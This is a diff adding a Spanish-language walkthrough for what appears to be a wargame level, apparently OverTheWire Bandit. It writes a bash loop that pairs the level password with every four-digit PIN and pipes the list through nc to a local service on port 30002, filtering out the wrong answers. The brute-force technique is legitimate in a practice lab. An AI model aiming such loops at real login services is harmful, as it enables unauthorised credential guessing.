@@ -1,0 +1,32 @@
+// este nivel nos pide que a un archivo le pasemos la clave del nivel actual seguidamente de un pin de cuatro digitos
+// para hacer esto debemos hacer un ciclo usando el siguiente script
+// primero crearemos la carpeta temporal en la raiz
+// ⬇️
+mktemp -d
+
+// ahora nos meteremos dentro de la carpeta actual y crea un script.sh y daremos permiso de ejecucion
+// ⬇️
+touch script.sh
+chmod +x script.sh
+
+// dentro del script haremos el ciclo de 4 digitos, al hacer el ciclo de 4 digitos se debe usar el '..'
+#!/bin/bash
+
+for i in {0000..9999}; do
+  echo <clave_nivel_actual> ${i}
+done
+
+// una vez hecho esto, la salida la guardaremos en un archivo, por ejemplo diccionario.txt usando '>'
+
+// ahora podemos mandar todo este diccionario de golpe al puerto que nos solicitan, el cual es el puerto 30002
+// pero vemos que nos salen varios mensajes de error o incorrecto, entonces usaremos grep para que nos quite estos mensajes y aparte otro match que nos quite la palabra "Please"
+// ⬇️
+cat diccionario.txt | nc localhost 30002 | grep -v -E "Wrong|Please"
+
+// tambien podemos hacerlo de otra forma y es poner toda esta logica dentro de nuestro script
+// ⬇️
+#!/bin/bash
+
+for i in {0000..9999}; do
+  echo <clave_nivel_actual> ${i}
+done | nc localhost 30002 | grep -v -E "Wrong|Please"
